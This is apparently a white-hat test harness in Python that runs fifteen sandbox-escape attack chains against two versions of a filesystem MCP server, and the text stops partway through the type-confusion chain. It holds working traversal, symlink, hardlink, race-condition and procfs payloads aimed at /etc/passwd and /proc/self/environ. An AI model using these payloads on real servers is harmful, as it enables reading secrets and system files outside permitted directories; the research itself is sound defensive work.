"""Filesystem MCP — Attack Chains Campaign.

White-hat research engagement against the official filesystem MCP server,
using only read_file and list_directory. Runs 15 multi-step attack chains
against two versions side-by-side:
  v2025.3.28 — /tmp/fs_328 (pinned, vulnerable)
  v2025.7.29 — /tmp/fs_729 (latest, patched)

Outputs:
  tests/testbed/excel_reports/fs_attack_chains.xlsx
  tests/testbed/excel_reports/fs_attack_chains.raw.jsonl
  tests/testbed/excel_reports/fs_attack_chains.source_notes.md

Safety: all filesystem state lives under /tmp/mcp_attack_{328,729} and
/tmp/victim_{328,729}. Nothing is written outside /tmp. Escape detection
uses a canary string 'ATTACKER_CANARY_12345' — real host secrets are
never the success condition.
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import re
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# Windows console is cp1252 by default; force UTF-8 so unicode labels print.
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

FS_328 = "/tmp/fs_328/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"
FS_729 = "/tmp/fs_729/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"

SANDBOX_328 = "/tmp/mcp_attack_328"
SANDBOX_729 = "/tmp/mcp_attack_729"
VICTIM_328 = "/tmp/victim_328"
VICTIM_729 = "/tmp/victim_729"

CANARY = "ATTACKER_CANARY_12345"
CANARY_FILE_CONTENT = f"root:x:0:0:canary:/root:/bin/bash\n{CANARY}\n"

REPORTS_DIR = Path(__file__).resolve().parent / "excel_reports"
XLSX_OUT = REPORTS_DIR / "fs_attack_chains.xlsx"
JSONL_OUT = REPORTS_DIR / "fs_attack_chains.raw.jsonl"
NOTES_OUT = REPORTS_DIR / "fs_attack_chains.source_notes.md"

REQUEST_TIMEOUT_SEC = 15
SERVER_INIT_TIMEOUT_SEC = 30
RACE_BUDGET_SEC = 30
MAX_RESPONSE_BYTES = 10 * 1024 * 1024   # 10 MB cap per response
DOS_SIZE_THRESHOLD = 5 * 1024 * 1024    # 5 MB flags as HIGH

SANDBOXES = {"328": SANDBOX_328, "729": SANDBOX_729}
VICTIMS = {"328": VICTIM_328, "729": VICTIM_729}
SERVERS = {"328": FS_328, "729": FS_729}


# ---------------------------------------------------------------------------
# WSL shell helpers — all fixture planting happens inside WSL because the
# servers run there and Windows can't create Unix symlinks / hardlinks / FIFOs.
# ---------------------------------------------------------------------------

def wsl_bash(script: str, check: bool = True, timeout: int = 30) -> subprocess.CompletedProcess:
    """Run a bash script inside WSL and return the CompletedProcess."""
    return subprocess.run(
        ["wsl", "bash", "-lc", script],
        capture_output=True,
        text=True,
        check=check,
        timeout=timeout,
    )


def wsl_python(script: str, check: bool = True, timeout: int = 30) -> subprocess.CompletedProcess:
    """Run a python3 one-liner inside WSL. Use for operations that need raw
    bytes in filenames (null byte, non-UTF8) that bash cannot express."""
    return subprocess.run(
        ["wsl", "python3", "-c", script],
        capture_output=True,
        text=True,
        check=check,
        timeout=timeout,
    )


def wsl_file_exists(path: str) -> bool:
    cp = wsl_bash(f"test -e {path!r} && echo yes || echo no", check=False)
    return cp.stdout.strip() == "yes"


def wsl_read_file(path: str) -> str:
    cp = wsl_bash(f"cat {path!r}", check=False)
    return cp.stdout


# ---------------------------------------------------------------------------
# Fixture builder — wipe and rebuild per-version sandbox state.
# ---------------------------------------------------------------------------

def wipe_and_recreate(version: str) -> None:
    """Reset sandbox + victim dir for one version to a clean baseline."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        set -e
        rm -rf {sandbox!r} {victim!r} {sandbox}_evil {sandbox}_indirect
        mkdir -p {sandbox!r} {victim!r}
        printf '%s' {CANARY_FILE_CONTENT!r} > {victim!r}/passwd_canary
        echo 'hello from the sandbox' > {sandbox!r}/readme.txt
        mkdir -p {sandbox!r}/subdir
        echo 'nested file' > {sandbox!r}/subdir/nested.txt
    """
    wsl_bash(script)


def wipe_all() -> None:
    for v in SANDBOXES:
        wipe_and_recreate(v)


# ---------------------------------------------------------------------------
# Pure helpers — text cleaning, truncation, and hit classification.
# ---------------------------------------------------------------------------

_CTRL_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
_ABS_PATH_RE = re.compile(r"(?:/[a-zA-Z0-9_.+-]+){2,}")
_SECRET_MARKERS = ("AWS_SECRET", "API_KEY", "PASSWORD=", "SECRET_KEY")


def clean_text(text: str) -> str:
    return _CTRL_RE.sub(lambda m: f"<0x{ord(m.group()):02x}>", text)


def truncate(text: str, limit: int = 600) -> str:
    text = clean_text(text)
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[...{len(text)} chars total]"


def _is_regression(pinned: str, latest: str) -> bool:
    """True if the two versions behaved meaningfully differently."""
    def is_block(text: str) -> bool:
        low = text.lower()
        return any(k in low for k in (
            "access denied", "outside allowed", "not allowed",
            "forbidden", "error:", "tool error",
        ))

    p_blocked = is_block(pinned)
    l_blocked = is_block(latest)
    if p_blocked != l_blocked:
        return True
    if not p_blocked and not l_blocked:
        p2 = re.sub(r"\s+", " ", pinned.strip().lower())
        l2 = re.sub(r"\s+", " ", latest.strip().lower())
        return p2 != l2
    return False


def classify_hit(
    input_path: Any,
    pinned: str,
    latest: str,
    pinned_elapsed_ms: int,
    latest_elapsed_ms: int,
) -> tuple[str, str, bool]:
    """Return (severity, reason, is_regression)."""
    regression = _is_regression(pinned, latest)
    combined = f"{pinned}\n{latest}"

    # CRITICAL — leaks dominate
    if CANARY in combined:
        return "CRITICAL", f"canary string '{CANARY}' leaked — real sandbox escape", regression
    if re.search(r"\broot:x:", combined):
        return "CRITICAL", "/etc/passwd marker 'root:x:' in response", regression
    if "BEGIN OPENSSH" in combined or "BEGIN RSA" in combined or "ssh-rsa " in combined:
        return "CRITICAL", "SSH key material in response", regression
    if any(m in combined for m in _SECRET_MARKERS):
        return "CRITICAL", "credential marker in response", regression

    # HIGH — crashes, timeouts, oversized
    if pinned_elapsed_ms >= REQUEST_TIMEOUT_SEC * 1000 or latest_elapsed_ms >= REQUEST_TIMEOUT_SEC * 1000:
        return "HIGH", "request timeout / hang (>= 15s)", regression
    if len(pinned) >= DOS_SIZE_THRESHOLD or len(latest) >= DOS_SIZE_THRESHOLD:
        mb = max(len(pinned), len(latest)) / (1024 * 1024)
        return "HIGH", f"oversized response ({mb:.1f} MB) — DoS candidate", regression
    if "Traceback" in combined or "UnhandledPromiseRejection" in combined or "\n    at Object." in combined:
        return "HIGH", "stack trace in response (unhandled error)", regression

    # MEDIUM — info leak
    input_str = str(input_path) if input_path is not None else ""
    for match in _ABS_PATH_RE.findall(combined):
        if not match or match in input_str:
            continue
        if "node_modules" in match:
            return "MEDIUM", f"internal path leaked: {match[:80]}", regression
        if match.startswith(("/home/", "/root/", "/Users/")):
            return "MEDIUM", f"host path leaked: {match[:80]}", regression

    if regression:
        return "LOW", "behavioral divergence between versions", True

    return "INFO", "no hit", False


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class StepCall:
    """One tool call to make. Populated by chain definitions."""
    chain_id: str
    step_num: int
    pre_setup: str
    tool: str
    path: Any
    extra_args: dict[str, Any] = field(default_factory=dict)
    label: str = ""


@dataclass
class StepResult:
    chain_id: str
    step_num: int
    tool: str
    path_repr: str
    label: str
    pre_setup: str
    pinned_response: str
    pinned_elapsed_ms: int
    latest_response: str
    latest_elapsed_ms: int
    severity: str = "INFO"
    reason: str = ""
    is_regression: bool = False


# ---------------------------------------------------------------------------
# Per-version path templating.
# ---------------------------------------------------------------------------

def render_path(value: Any, version: str) -> Any:
    """Resolve {SANDBOX} / {VICTIM} placeholders for one version.
    Non-string values pass through unchanged (type-confusion probes)."""
    if not isinstance(value, str):
        return value
    return value.replace("{SANDBOX}", SANDBOXES[version]).replace("{VICTIM}", VICTIMS[version])


# ---------------------------------------------------------------------------
# MCP client — spawns one stdio server per version per call batch.
# ---------------------------------------------------------------------------

async def _call_batch(version: str, calls: list[StepCall]) -> list[tuple[str, int]]:
    """Run calls against one version's server. Returns (response_text, elapsed_ms)."""
    from mcp import ClientSession
    from mcp.client.stdio import StdioServerParameters, stdio_client
    import anyio

    params = StdioServerParameters(
        command="wsl",
        args=["node", SERVERS[version], SANDBOXES[version]],
    )
    out: list[tuple[str, int]] = []

    async def one(session: ClientSession, call: StepCall) -> tuple[str, int]:
        t0 = time.monotonic()
        try:
            args: dict[str, Any] = {"path": render_path(call.path, version)}
            for k, v in call.extra_args.items():
                args[k] = render_path(v, version)
            with anyio.fail_after(REQUEST_TIMEOUT_SEC):
                resp = await session.call_tool(call.tool, args)
            parts = [b.text for b in (resp.content or []) if hasattr(b, "text")]
            text = "\n".join(parts) or "(empty response)"
        except TimeoutError:
            text = f"TIMEOUT after {REQUEST_TIMEOUT_SEC}s"
        except Exception as exc:
            text = f"TOOL ERROR: {type(exc).__name__}: {exc}"
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        if len(text) > MAX_RESPONSE_BYTES:
            text = text[:MAX_RESPONSE_BYTES] + f"\n[TRUNCATED — original {len(text)} bytes]"
        return text, elapsed_ms

    try:
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                with anyio.fail_after(SERVER_INIT_TIMEOUT_SEC):
                    await session.initialize()
                for call in calls:
                    out.append(await one(session, call))
                    print(".", end="", flush=True)
    except Exception as exc:
        remaining = len(calls) - len(out)
        print(f"\n  [server {version} fatal] {exc}")
        out.extend([(f"SERVER FAILED: {exc}", 0)] * remaining)

    return out


def run_calls_both_versions(calls: list[StepCall]) -> list[StepResult]:
    """Run the same call list against both versions, pair, score."""
    print(f"\n  v2025.3.28 ", end="", flush=True)
    p = asyncio.run(_call_batch("328", calls))
    print(f" done.\n  v2025.7.29 ", end="", flush=True)
    l = asyncio.run(_call_batch("729", calls))
    print(" done.")

    results: list[StepResult] = []
    for call, (pr, pe), (lr, le) in zip(calls, p, l):
        sev, reason, regression = classify_hit(call.path, pr, lr, pe, le)
        results.append(StepResult(
            chain_id=call.chain_id,
            step_num=call.step_num,
            tool=call.tool,
            path_repr=repr(call.path)[:300],
            label=call.label,
            pre_setup=call.pre_setup,
            pinned_response=pr,
            pinned_elapsed_ms=pe,
            latest_response=lr,
            latest_elapsed_ms=le,
            severity=sev,
            reason=reason,
            is_regression=regression,
        ))
    return results


# ---------------------------------------------------------------------------
# Phase 0 — Source analysis. Hardcoded findings from reading both versions'
# index.js files. Each entry names a function, shows a real snippet, and
# identifies the gap that a chain below is aimed at.
# ---------------------------------------------------------------------------

SOURCE_NOTES: list[dict[str, str]] = [
    {
        "version": "v2025.3.28",
        "function": "validatePath (line 52)",
        "snippet": (
            "const isAllowed = allowedDirectories.some(dir =>\n"
            "    normalizedRequested.startsWith(dir));\n"
            "if (!isAllowed) {\n"
            "    throw new Error(`Access denied - path outside allowed directories: "
            "${absolute} not in ${allowedDirectories.join(', ')}`);\n"
            "}"
        ),
        "gap_identified": (
            "Bare startsWith(dir) without a trailing slash. If allowed dir is "
            "/tmp/mcp_attack_328 then /tmp/mcp_attack_328_evil/loot also matches "
            "— classic prefix-confusion. Also, the full allow-list is echoed in "
            "the error message (info leak)."
        ),
        "attack_idea": "C1 Prefix confusion — create sandbox_evil sibling and read through it.",
    },
    {
        "version": "v2025.3.28",
        "function": "validatePath (line 60) — symlink realpath check",
        "snippet": (
            "const realPath = await fs.realpath(absolute);\n"
            "const normalizedReal = normalizePath(realPath);\n"
            "const isRealPathAllowed = allowedDirectories.some(dir =>\n"
            "    normalizedReal.startsWith(dir));\n"
            "if (!isRealPathAllowed) {\n"
            "    throw new Error('Access denied - symlink target outside allowed directories');\n"
            "}"
        ),
        "gap_identified": (
            "Same startsWith bug on the realpath. A symlink pointing to a sibling "
            "dir /tmp/mcp_attack_328_evil/... will also pass. Hardlinks are "
            "invisible to realpath by design — this check does nothing for them."
        ),
        "attack_idea": "C2/C8 — symlink to sibling via prefix, hardlink to external canary.",
    },
    {
        "version": "v2025.3.28",
        "function": "no null-byte or type check",
        "snippet": (
            "// validatePath goes straight from expandHome -> path.resolve -> normalize\n"
            "// There is no explicit null-byte rejection before startsWith.\n"
            "// Schema z.object({path: z.string()}) rejects non-strings upstream."
        ),
        "gap_identified": (
            "Null bytes pass through the validator. Node fs.readFile will "
            "typically throw ERR_INVALID_ARG_VALUE on \\x00, but the error text "
            "may reveal host paths. Non-string paths are caught by zod — low "
            "surface for type confusion."
        ),
        "attack_idea": "C12 null-byte probes; skip schema-layer type confusion on reads.",
    },
    {
        "version": "v2025.7.29",
        "function": "isPathWithinAllowedDirectories (path-validation.js)",
        "snippet": (
            "if (absolutePath.includes('\\x00')) return false;\n"
            "let normalizedPath = path.resolve(path.normalize(absolutePath));\n"
            "return allowedDirectories.some(dir => {\n"
            "    const normalizedDir = path.resolve(path.normalize(dir));\n"
            "    if (normalizedPath === normalizedDir) return true;\n"
            "    if (normalizedDir === path.sep) return normalizedPath.startsWith(path.sep);\n"
            "    return normalizedPath.startsWith(normalizedDir + path.sep);\n"
            "});"
        ),
        "gap_identified": (
            "Fix for CVE-53109/53110: trailing separator closes the prefix "
            "confusion gap, explicit null-byte rejection, and path.normalize "
            "before path.resolve handles ....// sequences. No Unicode "
            "NFC/NFD normalization — JS string comparison != kernel inode lookup. "
            "Nothing about hardlinks — realpath can't see them."
        ),
        "attack_idea": "C11 Unicode NFC/NFD; C8 Hardlink escape (main bet).",
    },
    {
        "version": "v2025.7.29",
        "function": "allowedDirectories startup (line 41)",
        "snippet": (
            "let allowedDirectories = await Promise.all(args.map(async (dir) => {\n"
            "    const absolute = path.isAbsolute(dir) ? path.resolve(dir) : "
            "path.resolve(process.cwd(), dir);\n"
            "    try {\n"
            "        const resolved = await fs.realpath(absolute);\n"
            "        return normalizePath(resolved);\n"
            "    } catch {\n"
            "        return normalizePath(absolute);\n"
            "    }\n"
            "}));"
        ),
        "gap_identified": (
            "Latest realpaths the allowed dir itself at startup — closes a class "
            "of bugs where sandbox was a symlink. Pinned never did this, so if "
            "sandbox is itself under a symlinked parent, pinned may compare "
            "inconsistent paths."
        ),
        "attack_idea": "C7 Parent-dir symlink — only interesting on pinned.",
    },
    {
        "version": "v2025.7.29",
        "function": "validatePath (line 78-82)",
        "snippet": (
            "const realPath = await fs.realpath(absolute);\n"
            "const normalizedReal = normalizePath(realPath);\n"
            "if (!isPathWithinAllowedDirectories(normalizedReal, allowedDirectories)) {\n"
            "    throw new Error(`Access denied - symlink target outside allowed "
            "directories: ${realPath} not in ${allowedDirectories.join(', ')}`);\n"
            "}"
        ),
        "gap_identified": (
            "Classic check-use gap still exists: realpath() runs, then "
            "fs.readFile() runs separately. Between the two, an attacker can "
            "swap the path from a legitimate file to a symlink. Error message "
            "still leaks the full realpath (info disclosure)."
        ),
        "attack_idea": "C9 TOCTOU race — tight loop swapping file<->symlink during reads.",
    },
]


def write_source_notes() -> None:
    lines = ["# Filesystem MCP Source Analysis\n\n"]
    for e in SOURCE_NOTES:
        lines.append(f"## {e['version']} — `{e['function']}`\n\n")
        lines.append(f"```js\n{e['snippet']}\n```\n\n")
        lines.append(f"**Gap:** {e['gap_identified']}\n\n")
        lines.append(f"**Attack:** {e['attack_idea']}\n\n---\n\n")
    NOTES_OUT.write_text("".join(lines), encoding="utf-8")


# ---------------------------------------------------------------------------
# Phase 1 — Recon. Legitimate-looking requests whose errors leak info.
# ---------------------------------------------------------------------------

def recon_calls() -> list[StepCall]:
    return [
        StepCall("RECON", 1, "", "read_file", "",
                 label="empty-string path — does error echo allowed dirs?"),
        StepCall("RECON", 2, "", "read_file", "/",
                 label="root path — canonical sandbox path leak?"),
        StepCall("RECON", 3, "", "list_directory", "",
                 label="list empty path"),
        StepCall("RECON", 4, "", "list_directory", "/",
                 label="list root"),
        StepCall("RECON", 5, "", "read_file", "/etc/passwd",
                 label="direct /etc/passwd — expected block, fingerprint error shape"),
        StepCall("RECON", 6, "", "read_file", "{SANDBOX}",
                 label="read sandbox itself — EISDIR error shape"),
        StepCall("RECON", 7, "", "list_directory", "{SANDBOX}/nonexistent",
                 label="ENOENT error shape — does it echo absolute path?"),
        StepCall("RECON", 8, "", "read_file", "{SANDBOX}/readme.txt",
                 label="baseline success"),
        StepCall("RECON", 9, "", "list_directory", "{SANDBOX}",
                 label="baseline list success"),
        StepCall("RECON", 10, "", "read_file", "../etc/passwd",
                 label="relative traversal — what is cwd?"),
    ]


def run_recon_phase() -> list[StepResult]:
    print("\n[Phase 1] Recon")
    wipe_all()
    return run_calls_both_versions(recon_calls())


# ---------------------------------------------------------------------------
# Phase 2 — Primitive discovery. One question per probe.
# ---------------------------------------------------------------------------

def plant_primitives(version: str) -> None:
    """Build the fixture set needed by Phase 2 primitives."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        set -e
        cd {sandbox!r}
        ln -sf {victim!r}/passwd_canary sym_to_canary
        ln -f {victim!r}/passwd_canary hard_to_canary || true
        python3 -c 'open("cafe\\u0301.txt", "w").write("NFD file content\\n")'
        python3 -c 'open("caf\\u00e9.txt", "w").write("NFC file content\\n")'
        python3 -c 'open("ok.txt", "w").write("null prefix content\\n")'
    """
    wsl_bash(script)


def primitive_calls() -> list[StepCall]:
    return [
        StepCall("PRIM", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/sym_to_canary",
                 "read_file", "{SANDBOX}/sym_to_canary",
                 label="Q: does realpath reject the symlink target outside sandbox?"),
        StepCall("PRIM", 2, "ln {VICTIM}/passwd_canary {SANDBOX}/hard_to_canary",
                 "read_file", "{SANDBOX}/hard_to_canary",
                 label="Q: does realpath detect hardlinks? (it cannot — main bet)"),
        StepCall("PRIM", 3, "", "read_file", "{SANDBOX}_evil/anything",
                 label="Q: is allow-list startsWith without trailing slash?"),
        StepCall("PRIM", 4, "NFD-named file plant",
                 "read_file", "{SANDBOX}/caf\u00e9.txt",
                 label="Q: NFC query finds NFD-named file?"),
        StepCall("PRIM", 5, "", "read_file", "{SANDBOX}/ok.txt\x00hidden",
                 label="Q: does path handling truncate at null byte?"),
        StepCall("PRIM", 6, "", "read_file", "{SANDBOX}/../mcp_attack_328/readme.txt",
                 label="Q: normalize before allow-list check?"),
        StepCall("PRIM", 7, "", "list_directory", "{SANDBOX}/.",
                 label="Q: '.' segment pass through normalize?"),
        StepCall("PRIM", 8, "", "read_file", "{SANDBOX}/./readme.txt",
                 label="Q: dot-segment normalization consistent?"),
        StepCall("PRIM", 9, "", "read_file", "{SANDBOX}//readme.txt",
                 label="Q: double-slash collapsed by normalize?"),
        StepCall("PRIM", 10, "", "read_file", "{SANDBOX}/readme.txt\x00",
                 label="Q: trailing null byte — rejected or truncated?"),
        StepCall("PRIM", 11, "", "read_file", "/proc/self/root{SANDBOX}/readme.txt",
                 label="Q: procfs self/root prefix handled?"),
        StepCall("PRIM", 12, "", "read_file", 42,
                 label="Q: integer path — schema rejection?"),
        StepCall("PRIM", 13, "", "read_file", ["{SANDBOX}/readme.txt"],
                 label="Q: array path — schema rejection?"),
        StepCall("PRIM", 14, "", "read_file", "a" * 5000,
                 label="Q: very long path — ENAMETOOLONG or truncation?"),
        StepCall("PRIM", 15, "", "read_file", "{SANDBOX}/" + "../" * 20 + "etc/passwd",
                 label="Q: 20-level traversal collapse?"),
    ]


def run_primitives_phase() -> list[StepResult]:
    print("\n[Phase 2] Primitives")
    for v in SANDBOXES:
        wipe_and_recreate(v)
        plant_primitives(v)
    return run_calls_both_versions(primitive_calls())


# ---------------------------------------------------------------------------
# Phase 3 — Attack chains. Each chain = setup fn + list of StepCall.
# ---------------------------------------------------------------------------

@dataclass
class Chain:
    chain_id: str
    name: str
    hypothesis: str
    setup: Any   # callable(version: str) -> None
    calls: Any   # callable() -> list[StepCall]


# ---- C1: Prefix confusion ------------------------------------------------

def setup_c1(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        rm -rf {sandbox}_evil
        mkdir -p {sandbox}_evil
        printf '%s' {CANARY_FILE_CONTENT!r} > {sandbox}_evil/loot.txt
    """)


def calls_c1() -> list[StepCall]:
    return [
        StepCall("C1", 1, "mkdir {SANDBOX}_evil && plant loot",
                 "read_file", "{SANDBOX}_evil/loot.txt",
                 label="prefix-confusion — read loot in sibling dir"),
        StepCall("C1", 2, "", "list_directory", "{SANDBOX}_evil",
                 label="prefix-confusion — list sibling dir"),
        StepCall("C1", 3, "", "read_file", "{SANDBOX}_evil/../victim_328/passwd_canary",
                 label="prefix-confusion + traversal to victim"),
    ]


# ---- C2: Symlink plant → read --------------------------------------------

def setup_c2(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"ln -sf {victim}/passwd_canary {sandbox}/link_to_canary")


def calls_c2() -> list[StepCall]:
    return [
        StepCall("C2", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/link_to_canary",
                 "read_file", "{SANDBOX}/link_to_canary",
                 label="basic symlink plant → read target"),
        StepCall("C2", 2, "", "list_directory", "{SANDBOX}",
                 label="list shows the symlink?"),
    ]


# ---- C3: Symlink chain ---------------------------------------------------

def setup_c3(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"""
        set -e
        ln -sf {victim}/passwd_canary {sandbox}/chain_c
        ln -sf {sandbox}/chain_c {sandbox}/chain_b
        ln -sf {sandbox}/chain_b {sandbox}/chain_a
    """)


def calls_c3() -> list[StepCall]:
    return [
        StepCall("C3", 1, "3-link symlink chain A->B->C->canary",
                 "read_file", "{SANDBOX}/chain_a",
                 label="symlink chain to canary"),
    ]


# ---- C4: Symlink loop DoS ------------------------------------------------

def setup_c4(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        ln -sf {sandbox}/loop_b {sandbox}/loop_a
        ln -sf {sandbox}/loop_a {sandbox}/loop_b
    """)


def calls_c4() -> list[StepCall]:
    return [
        StepCall("C4", 1, "ln -s A->B, B->A (loop)",
                 "read_file", "{SANDBOX}/loop_a",
                 label="symlink loop — hang or ELOOP?"),
        StepCall("C4", 2, "", "list_directory", "{SANDBOX}/loop_a",
                 label="list on loop target"),
    ]


# ---- C5: Dangling symlink info leak --------------------------------------

def setup_c5(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"ln -sf /var/never/exists/secret_target {sandbox}/dangling")


def calls_c5() -> list[StepCall]:
    return [
        StepCall("C5", 1, "ln -s /var/never/exists/secret_target {SANDBOX}/dangling",
                 "read_file", "{SANDBOX}/dangling",
                 label="dangling symlink — does error echo target?"),
    ]


# ---- C6: Dir-symlink nested read -----------------------------------------

def setup_c6(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"ln -sf {victim} {sandbox}/victim_link")


def calls_c6() -> list[StepCall]:
    return [
        StepCall("C6", 1, "ln -s {VICTIM} {SANDBOX}/victim_link",
                 "list_directory", "{SANDBOX}/victim_link",
                 label="list dir-symlink pointing outside"),
        StepCall("C6", 2, "", "read_file", "{SANDBOX}/victim_link/passwd_canary",
                 label="read file under dir-symlink"),
    ]


# ---- C7: Parent-dir symlink ----------------------------------------------

def setup_c7(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        rm -f {sandbox}_indirect
        ln -sf {sandbox} {sandbox}_indirect
    """)


def calls_c7() -> list[StepCall]:
    return [
        StepCall("C7", 1, "ln -s {SANDBOX} {SANDBOX}_indirect",
                 "read_file", "{SANDBOX}_indirect/readme.txt",
                 label="symlinked parent — does realpath match after resolve?"),
    ]


# ---- C8: HARDLINK ESCAPE (the main bet) ----------------------------------

def setup_c8(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"ln {victim}/passwd_canary {sandbox}/hardlink_to_canary")


def calls_c8() -> list[StepCall]:
    return [
        StepCall("C8", 1, "ln {VICTIM}/passwd_canary {SANDBOX}/hardlink_to_canary",
                 "read_file", "{SANDBOX}/hardlink_to_canary",
                 label="HARDLINK BET — read canary through inode-aliased file"),
        StepCall("C8", 2, "", "list_directory", "{SANDBOX}",
                 label="does listing reveal the hardlink as normal file?"),
    ]


# ---- C9: TOCTOU race -----------------------------------------------------

def setup_c9(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"echo benign > {sandbox}/race_target")


def calls_c9() -> list[StepCall]:
    return [
        StepCall("C9", i, "background shell rotating race_target file<->symlink",
                 "read_file", "{SANDBOX}/race_target",
                 label=f"race attempt #{i}")
        for i in range(1, 21)
    ]


@contextlib.contextmanager
def swap_loop(version: str):
    """Background loop in WSL that rotates race_target between a benign file
    and a symlink to the canary. Bounded by RACE_BUDGET_SEC."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        end=$(( $(date +%s) + {RACE_BUDGET_SEC} ))
        while [ $(date +%s) -lt $end ]; do
            ln -sf {victim}/passwd_canary {sandbox}/race_target.new 2>/dev/null
            mv -f {sandbox}/race_target.new {sandbox}/race_target 2>/dev/null
            echo benign > {sandbox}/race_target.tmp 2>/dev/null
            mv -f {sandbox}/race_target.tmp {sandbox}/race_target 2>/dev/null
        done
    """
    proc = subprocess.Popen(
        ["wsl", "bash", "-lc", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        yield
    finally:
        proc.kill()
        try:
            proc.wait(timeout=5)
        except Exception:
            pass


# ---- C10: Procfs pivot ---------------------------------------------------

def setup_c10(version: str) -> None:
    wipe_and_recreate(version)


def calls_c10() -> list[StepCall]:
    return [
        StepCall("C10", 1, "", "read_file", "/proc/self/root/etc/passwd",
                 label="procfs self/root — absolute"),
        StepCall("C10", 2, "", "read_file", "{SANDBOX}/../proc/self/root/etc/passwd",
                 label="procfs via relative"),
        StepCall("C10", 3, "", "read_file", "/proc/1/root/etc/passwd",
                 label="pid 1 root view"),
        StepCall("C10", 4, "", "read_file", "/proc/self/cwd/readme.txt",
                 label="procfs self/cwd"),
        StepCall("C10", 5, "", "read_file", "/proc/self/environ",
                 label="process environment leak"),
    ]


# ---- C11: Unicode normalization ------------------------------------------

def setup_c11(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_python(f"""
import os
open({sandbox!r} + '/cafe\\u0301_nfd.txt', 'w').write('NFD-named file\\n')
open({sandbox!r} + '/caf\\u00e9_nfc.txt', 'w').write('NFC-named file\\n')
""")


def calls_c11() -> list[StepCall]:
    return [
        StepCall("C11", 1, "plant NFD-named file",
                 "read_file", "{SANDBOX}/caf\u00e9_nfd.txt",
                 label="NFC query → NFD file"),
        StepCall("C11", 2, "plant NFC-named file",
                 "read_file", "{SANDBOX}/cafe\u0301_nfc.txt",
                 label="NFD query → NFC file"),
        StepCall("C11", 3, "", "read_file", "{SANDBOX}/\uff0e\uff0e/etc/passwd",
                 label="fullwidth .. (U+FF0E) traversal"),
        StepCall("C11", 4, "", "read_file", "{SANDBOX}\u202e/etc/passwd",
                 label="RTL override injection"),
    ]


# ---- C12: Null-byte / control-char truncation ----------------------------

def setup_c12(version: str) -> None:
    wipe_and_recreate(version)


def calls_c12() -> list[StepCall]:
    return [
        StepCall("C12", 1, "", "read_file", "{SANDBOX}/readme.txt\x00/etc/passwd",
                 label="null-byte truncation"),
        StepCall("C12", 2, "", "read_file", "{SANDBOX}/readme.txt\x00{VICTIM}/passwd_canary",
                 label="null-byte to victim canary"),
        StepCall("C12", 3, "", "read_file", "{SANDBOX}\x00/../etc/passwd",
                 label="null inside directory segment"),
        StepCall("C12", 4, "", "read_file", "{SANDBOX}/readme.txt\n/etc/passwd",
                 label="CRLF injection"),
    ]


# ---- C13: CVE-53110 mutation family --------------------------------------

def setup_c13(version: str) -> None:
    wipe_and_recreate(version)


def calls_c13() -> list[StepCall]:
    return [
        StepCall("C13", 1, "", "read_file", "{SANDBOX}/....//....//etc/passwd",
                 label="CVE-53110 literal pattern"),
        StepCall("C13", 2, "", "read_file", "{SANDBOX}/.....///.....///etc/passwd",
                 label="5-dot extension"),
        StepCall("C13", 3, "", "read_file", "{SANDBOX}/....\\/....\\/etc/passwd",
                 label="mixed backslash"),
        StepCall("C13", 4, "", "read_file",
                 "{SANDBOX}/%2e%2e%2e%2e//%2e%2e%2e%2e//etc/passwd",
                 label="URL-encoded 4-dot"),
        StepCall("C13", 5, "", "read_file", "{SANDBOX}/....///etc/passwd",
                 label="asymmetric 4-dot"),
        StepCall("C13", 6, "", "read_file", "{SANDBOX}/...//../etc/passwd",
                 label="3-dot with 2-dot chaser"),
    ]


# ---- C14: Type confusion / JSON-RPC smuggling ----------------------------

def setup_c14(version: str) -> None:
    wipe_and_recreate(version)


def calls_c14() -> list[StepCall]:
    return [
        StepCall("C14", 1, "", "read_file", [], label="empty array as path"),
        StepCall("C14", 2, "", "read_file", ["{SANDBOX}/readme.txt"],
                 label="array with one valid path"),
        StepCall("C14", 3, "", "read_file", {"path": "{SANDBOX}/readme.txt"},
                 label="object as path"),
        StepCall("C14", 4, "", "read_file", None, label="null as path"),
        StepCall("C14", 5, "", "read_file", 0, label="integer 0 as path"),
        StepCall("C14", 6, "", "read_file", True, label="boolean true as path"),
